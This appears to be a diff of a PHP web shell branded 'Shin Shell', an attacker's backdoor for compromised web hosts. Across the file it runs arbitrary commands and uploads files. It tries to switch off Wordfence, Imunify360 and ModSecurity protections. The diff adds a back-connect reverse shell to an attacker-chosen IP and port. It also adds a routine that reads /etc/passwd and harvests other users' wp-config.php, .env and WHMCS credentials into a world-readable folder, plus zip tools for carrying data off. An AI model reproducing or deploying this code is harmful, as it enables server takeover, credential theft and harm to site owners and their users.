@@ -1,20 +1,40 @@
 <?php
-echo "<!-- GIF89;a -->\n";
 @ini_set('error_log', NULL);
 @ini_set('log_errors', 0);
 @ini_set('max_execution_time', 0);
 @error_reporting(0);
 @set_time_limit(0);
-@ob_clean();
-@header("X-Accel-Buffering: no");
-@header("Content-Encoding: none");
-@http_response_code(403);
-@http_response_code(404);
-@http_response_code(500);
-//Kalau file terbaca sebagai gambar hapus atas ^
-//Shin Code - Created 15 July 2023
-//jan di ganti ganti ntar error aoakwkwk
-//Recode aja  banh penting ga cuma ganti copyright :')
+if (function_exists('litespeed_request_headers')) {
+    $headers = litespeed_request_headers();
+    if (isset($headers['X-LSCACHE'])) {
+        header('X-LSCACHE: off');
+    }
+}
+if (defined('WORDFENCE_VERSION')) {
+    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
+    define('WORDFENCE_DISABLE_FILE_MODS', true);
+}
+if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
+    $imunifyHeaders = imunify360_request_headers();
+    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
+        header('X-Imunify360-Request: bypass');
+    }
+    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
+        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
+    }
+}
+if (function_exists('apache_request_headers')) {
+    $apacheHeaders = apache_request_headers();
+    if (isset($apacheHeaders['X-Mod-Security'])) {
+        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
+    }
+}
+if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
+    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
+    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
+        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
+    }
+}
 function getFileDetails($path)
 {
     $folders = [];
@@ -50,7 +70,6 @@ function getFileDetails($path)
         return 'None';
     }
 }
-
 function formatSize($size)
 {
     $units = array('B', 'KB', 'MB', 'GB', 'TB');
@@ -61,7 +80,6 @@ function formatSize($size)
     }
     return round($size, 2) . ' ' . $units[$i];
 }
-//cmd fitur
 function executeCommand($command)
 {
     $currentDirectory = getCurrentDirectory();
@@ -165,7 +183,6 @@ function saveFileContent($file)
     }
     return false;
 }
-//upfile
 function uploadFile($targetDirectory)
 {
     if (isset($_FILES['file'])) {
@@ -181,9 +198,8 @@ function uploadFile($targetDirectory)
         }
     }
     return '';
+    }
 }
-}
-//dir
 function changeDirectory($path)
 {
     if ($path === '..') {
@@ -192,13 +208,10 @@ function changeDirectory($path)
         @chdir($path);
     }
 }
-
 function getCurrentDirectory()
 {
     return realpath(getcwd());
 }
-
-//open file juga folder
 function getLink($path, $name)
 {
     if (is_dir($path)) {
@@ -224,8 +237,6 @@ function getDirectoryArray($path)
     }
     return $directoryArray;
 }
-
-
 function showBreadcrumb($path)
 {
     $path = str_replace('\\', '/', $path);
@@ -245,31 +256,35 @@ function showBreadcrumb($path)
     </div>
     <?php
 }
-
-
-//tabel biar keren
 function showFileTable($path)
 {
-    $fileDetails = getFileDetails($path);
+    $fileDetails = @getFileDetails($path);
     ?>
     <table>
         <tr>
             <th>Name</th>
             <th>Type</th>
             <th>Size</th>
-            <th>Permission</th>
+            <th>Permission</th>            
             <th>Actions</th>
         </tr>
         <?php if (is_array($fileDetails)) { ?>
             <?php foreach ($fileDetails as $fileDetail) { ?>
                 <tr>
-                    <td><?php echo getLink($path . '/' . $fileDetail['name'], $fileDetail['name']); ?></td>
+                	<td>
+                	<svg style="width: 20px; height: 20px; margin-right: 5px;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                	<circle cx="12" cy="12" r="10"></circle>
+                    <line x1="12" y1="16" x2="12" y2="12"></line>
+                    <line x1="12" y1="8" x2="12" y2="8"></line>
+                </svg>
+                    <?php echo getLink($path . '/' . $fileDetail['name'], $fileDetail['name']); ?></td>
                     
-                    <td><?php echo $fileDetail['type']; ?></td>
+                    <td>
+                    	<?php echo $fileDetail['type']; ?></td>
                     <td><?php echo $fileDetail['size']; ?></td>
                     <td>
                         <?php
-                        $permissionColor = is_writable($path . '/' . $fileDetail['name']) ? 'green' : 'red';
+                        $permissionColor = @is_writable($path . '/' . $fileDetail['name']) ? 'green' : 'red';
                         ?>
                         <span style="color: <?php echo $permissionColor; ?>"><?php echo $fileDetail['permission']; ?></span>
                         </td>
@@ -277,23 +292,23 @@ function showFileTable($path)
                             
                         <?php if ($fileDetail['type'] === 'File') { ?>
                             <div class="dropdown">
-                                <button class="dropbtn">Actions</button>
-                                <div class="dropdown-content">
-                                    <a href="?dir=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Edit</a>
-                                    <a href="?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>">Rename</a>
-                                    <a href="?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>">Chmod</a>
-                                    <a href="?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>">Delete</a>
-                                 </div>
+                                <select onchange="location.href = this.value;">
+                                	<option value="" selected disabled>Action : </option>
+                                    <option value="?dir=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Edit</option>
+                                    <option value="?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>">Rename</option>
+                                    <option value="?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>">Chmod</option>
+                                    <option value="?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>">Delete</option>
+                                  </select>
                                </div>
                         <?php } ?>
                         <?php if ($fileDetail['type'] === 'Folder') { ?>
                             <div class="dropdown">
-                                <button class="dropbtn">Actions</button>
-                                <div class="dropdown-content">
-                                    <a href="?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>">Rename</a>
-                                    <a href="?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>">Chmod</a>
-                                    <a href="?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>">Delete</a>
-                                </div>
+                                <select onchange="location.href = this.value;">
+                                	<option value="" selected disabled>Action : </option>
+                                    <option value="?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>">Rename</option>
+                                    <option value="?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>">Chmod</option>
+                                    <option value="?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>">Delete</option>
+                                 </select>
                              </div>
                         <?php } ?>
                     </td>
@@ -307,7 +322,6 @@ function showFileTable($path)
     </table>
     <?php
 }
-//chmod
 function changePermission($path)
 {
     if (!file_exists($path)) {
@@ -335,12 +349,10 @@ function changePermission($path)
         return 'Error changing permission.';
     }
 }
-
-
 function chmodRecursive($path, $permission)
 {
     if (is_dir($path)) {
-        $items = scandir($path);
+        $items = @scandir($path);
         if ($items === false) {
             return false;
         }
@@ -374,14 +386,12 @@ function chmodRecursive($path, $permission)
 
     return true;
 }
-
-//rename
 function renameFile($oldName, $newName)
 {
     if (file_exists($oldName)) {
         $directory = dirname($oldName);
         $newPath = $directory . '/' . $newName;
-        if (rename($oldName, $newPath)) {
+        if (@rename($oldName, $newPath)) {
             return 'File or folder renamed successfully.';
         } else {
             return 'Error renaming file or folder.';
@@ -390,12 +400,10 @@ function renameFile($oldName, $newName)
         return 'File or folder does not exist.';
     }
 }
-
-//delete
 function deleteFile($file)
 {
     if (file_exists($file)) {
-        if (unlink($file)) {
+        if (@unlink($file)) {
             return 'File deleted successfully.' . $file;
         } else {
             return 'Error deleting file.';
@@ -404,15 +412,14 @@ function deleteFile($file)
         return 'File does not exist.';
     }
 }
-
 function deleteFolder($folder)
 {
     if (is_dir($folder)) {
-        $files = glob($folder . '/*');
+        $files = @glob($folder . '/*');
         foreach ($files as $file) {
             is_dir($file) ? deleteFolder($file) : unlink($file);
         }
-        if (rmdir($folder)) {
+        if (@rmdir($folder)) {
             return 'Folder deleted successfully.' . $folder;
         } else {
             return 'Error deleting folder.';
@@ -420,17 +427,14 @@ function deleteFolder($folder)
     } else {
         return 'Folder does not exist.';
     }
-}
-//main logic directory 
+} 
 $currentDirectory = getCurrentDirectory();
 $errorMessage = '';
 $responseMessage = '';
-
 if (isset($_GET['dir'])) {
     changeDirectory($_GET['dir']);
     $currentDirectory = getCurrentDirectory();
 }
-//edit
 if (isset($_GET['edit'])) {
     $file = $_GET['edit'];
     $content = readFileContent($file);
@@ -443,18 +447,15 @@ if (isset($_GET['edit'])) {
         }
     }
 }
-
 if (isset($_GET['chmod'])) {
     $file = $_GET['chmod'];
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $responseMessage = changePermission($file);
     }
 }
-
 if (isset($_POST['upload'])) {
     $responseMessage = uploadFile($currentDirectory);
 }
-
 if (isset($_POST['cmd'])) {
     $cmdOutput = executeCommand($_POST['cmd']);
 }
@@ -462,7 +463,7 @@ if (isset($_POST['cmd'])) {
 if (isset($_GET['rename'])) {
     $file = $_GET['rename'];
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        $newName = $_POST['new_name'];
+        $newName = @$_POST['new_name'];
         if (is_file($file) || is_dir($file)) {
             $responseMessage = renameFile($file, $newName);
         } else {
@@ -470,7 +471,6 @@ if (isset($_GET['rename'])) {
         }
     }
 }
-
 if (isset($_GET['delete'])) {
     $file = $_GET['delete'];
     if ($_SERVER['REQUEST_METHOD'] === 'GET') {
@@ -488,19 +488,18 @@ if (isset($_GET['delete'])) {
         }
     }
 }
-//panggil adminer
 if (isset($_POST['Summon'])) {
     $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
-    $currentPath = getCurrentDirectory();
+    $currentPath = @getCurrentDirectory();
 
     $fileUrl = $baseUrl;
-    $fileName = 'Adminer.php';
+    $fileName = 'adminer.php';
 
     $filePath = $currentPath . '/' . $fileName;
 
     $fileContent = @file_get_contents($fileUrl);
     if ($fileContent !== false) {
-        if (file_put_contents($filePath, $fileContent) !== false) {
+        if (@file_put_contents($filePath, $fileContent) !== false) {
      
             $responseMessage = 'File "' . $fileName . '" summoned successfully. <a href="' . $filePath . '">' . $filePath . '</a>';            
         } else {
@@ -510,43 +509,170 @@ if (isset($_POST['Summon'])) {
         $errorMessage = 'Failed to fetch the file content. None File';
     }
 }
-// katanya bypass
-if (function_exists('litespeed_request_headers')) {
-    $headers = litespeed_request_headers();
-    if (isset($headers['X-LSCACHE'])) {
-        header('X-LSCACHE: off');
+if (isset($_POST['bind'])) {
+    $errorMessage = '<p>Attempting Connection...</p>';
+    $ip     = $_POST['ip'];
+    $port   = (int)$_POST['port']; // Convert port to an integer
+    $sockfd = @fsockopen($ip, $port, $errno, $errstr);
+
+    if ($errno != 0) {
+        $errorMessage = "<font color='red'>$errno : $errstr</font>";
+    } else if (!$sockfd) {
+        $errorMessage = "<p>Unexpected error has occurred, connection may have failed.</p>";
+    } else {
+        fputs($sockfd, "{################################################################}\n");
+        fputs($sockfd, "..:: Shin Shell- Coded By Shin Code ::..\n");
+        fputs($sockfd, "\n=> Backconnect\n=> Back\n\n");
+        fputs($sockfd, "{################################################################}\n\n");
+
+        $dir     = @shell_exec("pwd");
+        $sysinfo = @shell_exec("uname -a");
+        $time    = @shell_exec("time");
+        $len     = 1337;
+
+        fputs($sockfd, "User connected @ $time\n\n");
+
+        while (!feof($sockfd)) {
+            $cmdPrompt = '[ShinCode]#:> ';
+            fputs($sockfd, $cmdPrompt);
+            $command = @fgets($sockfd, $len);
+            fputs($sockfd, "\n" . @shell_exec($command) . "\n\n");
+        }
+        fclose($sockfd);
+
+        // Add success message here if needed
+        $responseMessage = "<p>Connection successful!</p>";
+    }
+
+    echo $errorMessage;
+}
+if (isset($_POST['create_file']) && isset($_GET['create']) && $_GET['create'] === 'file') {
+    $fileName = $_POST['file_name'];
+    $currentDirectory = @getCurrentDirectory();
+    $filePath = $currentDirectory . '/' . $fileName;
+
+    if (!file_exists($filePath)) {
+        if (@file_put_contents($filePath, '') !== false) {
+            $responseMessage = 'File created successfully: ' . $fileName;
+        } else {
+            $errorMessage = 'Failed to create file.';
+        }
+    } else {
+        $errorMessage = 'File already exists: ' . $fileName;
+    }
+}
+if (isset($_POST['create_folder']) && isset($_GET['create']) && $_GET['create'] === 'folder') {
+    $folderName = $_POST['folder_name'];
+    $currentDirectory = @getCurrentDirectory();
+    $folderPath = $currentDirectory . '/' . $folderName;
+    if (!file_exists($folderPath)) {
+        if (@mkdir($folderPath)) {
+            $responseMessage = 'Folder created successfully: ' . $folderName;
+        } else {
+            $errorMessage = 'Failed to create folder.';
+        }
+    } else {
+        $errorMessage = 'Folder already exists: ' . $folderName;
+    }
+}
+if(isset($_GET['goo']) && $_GET['goo'] == 'config') {
+    $etc = @fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
+    $con = @mkdir("shin_configs", 0777);
+    $isi_htc = "Options all\nDirectoryIndex doesntexist.htm\nSatisfy Any";
+    $htc = fopen("shin_configs/.htaccess", "w");
+    @fwrite($htc, $isi_htc);
+
+    while ($passwd = fgets($etc)) {
+        if ($passwd == "" || !$etc) {
+            echo "<font color=red>Can't read /etc/passwd</font>";
+        } else {
+            preg_match_all('/(.*?):x:/', $passwd, $user_shinconfigfig);
+
+            foreach ($user_shinconfigfig[1] as $user_shinconfig) {
+                $user_shinconfigfig_dir = "/home/$user_shinconfig/public_html/";
+
+                if (is_readable($user_shinconfigfig_dir)) {
+                    $grab_config = [
+                        "/home/$user_shinconfig/public_html/wp-config.php" => "wordpress",
+                        "/home/$user_shinconfig/public_html/configuration.php" => "joomla-or-whmcs",
+                        "/home/$user_shinconfig/public_html/blog/wp-config.php" => "wordpress",
+                        "/home/$user_shinconfig/public_html/blog/configuration.php" => "joomla",
+                        "/home/$user_shinconfig/public_html/wp/wp-config.php" => "wordpress",
+                        "/home/$user_shinconfig/public_html/wordpress/wp-config.php" => "wordpress",
+                        "/home/$user_shinconfig/public_html/config.php" => "4images",
+                        "/home/$user_shinconfig/public_html/whmcs/configuration.php" => "whmcs",
+                        "/home/$user_shinconfig/public_html/support/configuration.php" => "supportwhmcs",
+                        "/home/$user_shinconfig/public_html/secure/configuration.php" => "securewhmcs",
+                        "/home/$user_shinconfig/public_html/clients/configuration.php" => "clientswhmcs",
+                        "/home/$user_shinconfig/public_html/client/configuration.php" => "clientwhmcs",
+                        "/home/$user_shinconfig/public_html/billing/configuration.php" => "billingwhmcs",
+                        "/home/$user_shinconfig/public_html/admin/config.php" => "Opencart",
+                        "/home/$user_shinconfig/public_html/.env" => "env",
+                        "/home/$user_shinconfig/public_html/application/config/database.php" => "elisab",
+                        "/home/$user_shinconfig/public_html/includes/config.php" => "forum"
+                    ];
+
+                    foreach ($grab_config as $config => $nama_config) {
+                        $ambil_config = @file_get_contents($config);
+
+                        if ($ambil_config == '') {
+                        	if ($ambil_config !== false) {
+                        } else {
+                        	
+                            $file_config = @fopen("shin_configs/$user_shinconfig-$nama_config.txt", "w");
+                            @fputs($file_config, $ambil_config);
+                        }
+                    }
+                }
+            }
+        }
+       }
+}
+$responseMessage = "<center><a href='?dir=$currentDirectory/shin_configs'>Done Touch Me</a></center>";
+}
+if (isset($_POST['extract-zip'])) {
+    $extractZipFile = $_FILES['extract-zip-file']['name'];
+    $extractZipPath = $currentDirectory . '/' . $extractZipFile;
+
+    $zip = new ZipArchive;
+    if ($zip->open($extractZipPath) === TRUE) {
+        $zip->extractTo($currentDirectory);
+        $zip->close();
+        $responseMessage = 'ZIP file extracted successfully.';
+        unlink($extractZipPath); // Delete the uploaded ZIP file after extraction
+    } else {
+        $errorMessage = 'Error extracting ZIP file.';
     }
 }
 
-if (defined('WORDFENCE_VERSION')) {
-    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
-    define('WORDFENCE_DISABLE_FILE_MODS', true);
-}
+if (isset($_POST['zip'])) {
+    $zipFile = $_POST['zip-file'];
+    $zipFileName = $currentDirectory . '/' . basename($zipFile) . '.zip';
+    
+    $zip = new ZipArchive;
+    if ($zip->open($zipFileName, ZipArchive::CREATE) === TRUE) {
+        if (is_dir($zipFile)) {
+            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($zipFile));
+            foreach ($files as $file) {
+                if (!$file->isDir()) {
+                    $filePath = $file->getRealPath();
+                    $relativePath = substr($filePath, strlen($zipFile) + 1);
+                    $zip->addFile($filePath, $relativePath);
+                }
+            }
+        } elseif (is_file($zipFile)) {
+            $zip->addFile($zipFile, basename($zipFile));
+        } else {
+            $errorMessage = 'Invalid file or directory specified for zipping.';
+        }
 
-if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
-    $imunifyHeaders = imunify360_request_headers();
-    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
-        header('X-Imunify360-Request: bypass');
-    }
-    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
-        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
-    }
-}
-
-
-if (function_exists('apache_request_headers')) {
-    $apacheHeaders = apache_request_headers();
-    if (isset($apacheHeaders['X-Mod-Security'])) {
-        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
-    }
-}
-
-if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
-    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
-    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
-        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
+        $zip->close();
+        $responseMessage = 'Files zipped successfully. <a href="?dir=' . urlencode($currentDirectory) . '&read=' . urlencode($zipFileName) . '">Download ZIP</a>';
+    } else {
+        $errorMessage = 'Error zipping files.';
     }
 }
+
 ?>
 <!DOCTYPE html>
 <html>
@@ -557,6 +683,7 @@ if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
 <body>
     <div class="container">
         <h1>[ Shin Bypassed ]</h1>
+        
         <div class="menu-icon" onclick="toggleSidebar()"></div>
         <hr>
         <div class="button-container">
@@ -564,22 +691,43 @@ if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
                 <input type="submit" name="Summon" value="Adminer" class="summon-button">
             </form>
             <button type="button" onclick="window.location.href='?gas'" class="summon-button">Mail Test</button>
+            <button type="button" onclick="window.location.href='?do=bc'" class="summon-button">BC</button>
+            <button type="button" onclick="window.location.href='?dir=<?php echo $currentDirectory ?>&goo=config'" class="summon-button">Config</button>
         </div>
-        
+        <hr>
+        <select onchange="location.href = this.value;">
+        	<option value="" selected disabled>Create File Or Folder</option>
+        	<option value="?dir=<?php echo $currentDirectory ?>&create=file">Create File</option>
+            <option value="?dir=<?php echo $currentDirectory ?>&create=folder">Create Folder</option>
+        </select>
+        <select onchange="location.href = this.value;">
+        	<option value="" selected disabled>Zipping</option>
+        	<option value="?dir=<?php echo $currentDirectory ?>&hahay=unzip" <?php echo isset($_GET['hahay']) && $_GET['hahay'] === 'unzip' ? 'selected' : ''; ?>>Un ZIP</option>
+        <option value="?dir=<?php echo $currentDirectory ?>&hahay=extract_zip" <?php echo isset($_GET['hahay']) && $_GET['hahay'] === 'extract_zip' ? 'selected' : ''; ?>>Extract ZIP</option>
+        </select>
 
+        
         <?php
         //mailer
         if (isset($_GET['gas'])) {
             if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 if (!empty($_POST['email'])) {
                     $xx = rand();
-                    if (mail($_POST['email'], "Shin Mailer Test - " . $xx, "Shin Ganteng")) {
+                    $subject = "Shin Mailer Test - " . $xx;
+                    $message = "<html><body>";
+                    $message .= "<h1>Hello, Shin Ganteng</h1>";
+                    $message .= "<p>from domain : " . $_SERVER['SERVER_NAME'] . "</p>";
+                    $message .= "<p>This is a test email sent from Shin Mailer.</p>";
+                    $message .= "</body></html>";
+                    $headers = "MIME-Version: 1.0" . "\r\n";
+                    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+                    if (mail($_POST['email'], $subject, $message,$headers)) {
                         echo "<b>Send a report to [" . $_POST['email'] . "] - $xx</b>";
                     } else {
-                        echo "Failed to send the email.";
+                        echo "<p style='color: red;'>Failed to send the email.</p>";
                     }
                 } else {
-                    echo "Please provide an email address.";
+                	echo "<p style='color: red;'>Please provide an email address.</p>";
                 }
             } else {
         ?>
@@ -596,8 +744,8 @@ if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
         <?php if (!empty($errorMessage)) { ?>
             <p style="color: red;"><?php echo $errorMessage; ?></p>
         <?php } ?>
+        	<hr>
 
-        <hr>
 
         <div class="upload-cmd-container">
             <div class="upload-form">
@@ -617,6 +765,27 @@ if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
                 </form>
             </div>
         </div>
+        
+       <?php
+       if (isset($_GET['do']) && ($_GET['do'] == 'bc')) {
+       echo"<div id='command-output'>
+       	<h2>Back Connect</h2>
+       	<p>Back connect will allow you to enter system commands remotely.</p>
+       <form method='post'>
+       	<table>
+       	<tr>
+       	<td>IP Address: </td>
+             <td><input type='text' name='ip' style='border:1px solid #5C7296; color: #5C7296;background-color:#transparent;font-size:13px;'></td>
+                 </tr>
+                 <tr>
+                     <td>Port: </td>
+                     <td><input type='text' name='port' style='border:1px solid #5C7296; color: #5C7296;background-color:#transparent;font-size:13px;'></td>
+                 </tr>
+                 <tr>
+                     <td><input type='submit' name='bind' value='Open Connection' style='border:1px solid #5C7296; color: #5C7296;background-color:#transparent;font-size:13px;'></td>
+                 </tr>
+             </table>
+        </form></div>";}?>
         <?php
         if (isset($_GET['read'])) {
             $file = $_GET['read'];
@@ -639,7 +808,26 @@ if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
 
         <?php if (!empty($responseMessage)) { ?>
             <p class="response-message" style="color: green;"><?php echo $responseMessage; ?></p>
-        <?php } ?>            
+        <?php } ?>
+        <?php if (isset($_GET['create']) && $_GET['create'] === 'file') { ?>
+    <div class="rename-form">
+        <h2>Create File:</h2>
+        <form method="post">
+            <input type="text" name="file_name" placeholder="New File Name">
+            <input type="submit" value="Create File" name="create_file" class="button">
+        </form>
+    </div>
+<?php } ?>
+	
+<?php if (isset($_GET['create']) && $_GET['create'] === 'folder') { ?>
+    <div class="rename-form">
+        <h2>Create Folder:</h2>
+        <form method="post">
+            <input type="text" name="folder_name" placeholder="New Folder Name">
+            <input type="submit" value="Create Folder" name="create_folder" class="button">
+        </form>
+    </div>
+<?php } ?>
         <?php if (isset($_GET['rename'])) { ?>
         <div class="rename-form">
             <h2>Rename File or Folder: <?php echo basename($file); ?></h2>
@@ -668,15 +856,38 @@ if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
                     <button class="button" type="submit">Change</button>
                 </form>
             </div>
-        <?php } ?>
+            <?php } ?>
+    <?php if (isset($_GET['hahay']) && $_GET['hahay'] == 'unzip') {?>
+    <div class="extract-zip-form">
+        <h2>Extract ZIP / Zip Files:</h2>
+        <form method="post" enctype="multipart/form-data">
+            <label for="extract-zip-file">Select ZIP File to Extract:</label>
+            <input type="file" name="extract-zip-file">
+            <button class="button" type="submit" name="extract-zip">Extract ZIP</button>
+        </form>
+    </div>
+    <?php } elseif (isset($_GET['hahay']) && $_GET['hahay'] == 'extract_zip') {?>
+    <h2>Zip Files / Directories:</h2>
+    <form method="post">
+        <label for="zip-file">Select File or Directory to Zip:</label>
+        <input type="text" name="zip-file" placeholder="Enter file or directory path" required>
+        <button class="button" type="submit" name="zip">Zip</button>
+    </form>
+    
+<?php } ?>
+
         <hr>
+</div>
 
         <?php
-        echo '<h2>Filemanager</h2>';
+        echo "<center>";
+        echo "<h2>Filemanager</h2>";
         showBreadcrumb($currentDirectory);
         showFileTable($currentDirectory);
+        echo "</center>";
         ?>
     </div>
+    
 <div class="sidebar" id="sidebar">
     <div class="sidebar-content">
         <div class="sidebar-close">
@@ -728,26 +939,27 @@ if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
                 <li>System: <?php echo @php_uname(); ?></li>
             </ul>
         </div>
+        
 
         <div class="info-container">
             <h2>System Info</h2>
             <ul class="info-list">
                 <?php
                 $features = [
-                    'Safe Mode' => ini_get('safe_mode') ? 'Enabled' : 'Disabled',
-                    'Disable Functions' => ini_get('disable_functions'),
-                    'GCC' => function_exists('shell_exec') && shell_exec('gcc --version') ? 'On' : 'Off',
-                    'Perl' => function_exists('shell_exec') && shell_exec('perl --version') ? 'On' : 'Off',
-                    'Python Version' => ($pythonVersion = shell_exec('python --version')) ? 'On (' . $pythonVersion . ')' : 'Off',
-                    'PKEXEC Version' => ($pkexecVersion = shell_exec('pkexec --version')) ? 'On (' . $pkexecVersion . ')' : 'Off',
-                    'Curl' => function_exists('shell_exec') && shell_exec('curl --version') ? 'On' : 'Off',
-                    'Wget' => function_exists('shell_exec') && shell_exec('wget --version') ? 'On' : 'Off',
-                    'Mysql' => function_exists('shell_exec') && shell_exec('mysql --version') ? 'On' : 'Off',
-                    'Ftp' => function_exists('shell_exec') && shell_exec('ftp --version') ? 'On' : 'Off',
-                    'Ssh' => function_exists('shell_exec') && shell_exec('ssh --version') ? 'On' : 'Off',
-                    'Mail' => function_exists('shell_exec') && shell_exec('mail --version') ? 'On' : 'Off',
-                    'cron' => function_exists('shell_exec') && shell_exec('cron --version') ? 'On' : 'Off',
-                    'SendMail' => function_exists('shell_exec') && shell_exec('sendmail --version') ? 'On' : 'Off',
+                    'Safe Mode' => @ini_get('safe_mode') ? 'Enabled' : 'Disabled',
+                    'Disable Functions' => @ini_get('disable_functions'),
+                    'GCC' => function_exists('shell_exec') && @shell_exec('gcc --version') ? 'On' : 'Off',
+                    'Perl' => function_exists('shell_exec') && @shell_exec('perl --version') ? 'On' : 'Off',
+                    'Python Version' => ($pythonVersion = @shell_exec('python --version')) ? 'On (' . $pythonVersion . ')' : 'Off',
+                    'PKEXEC Version' => ($pkexecVersion = @shell_exec('pkexec --version')) ? 'On (' . $pkexecVersion . ')' : 'Off',
+                    'Curl' => function_exists('shell_exec') && @shell_exec('curl --version') ? 'On' : 'Off',
+                    'Wget' => function_exists('shell_exec') && @shell_exec('wget --version') ? 'On' : 'Off',
+                    'Mysql' => function_exists('shell_exec') && @shell_exec('mysql --version') ? 'On' : 'Off',
+                    'Ftp' => function_exists('shell_exec') && @shell_exec('ftp --version') ? 'On' : 'Off',
+                    'Ssh' => function_exists('shell_exec') && @shell_exec('ssh --version') ? 'On' : 'Off',
+                    'Mail' => function_exists('shell_exec') && @shell_exec('mail --version') ? 'On' : 'Off',
+                    'cron' => function_exists('shell_exec') && @shell_exec('cron --version') ? 'On' : 'Off',
+                    'SendMail' => function_exists('shell_exec') && @shell_exec('sendmail --version') ? 'On' : 'Off',
                 ];
                 ?>
 
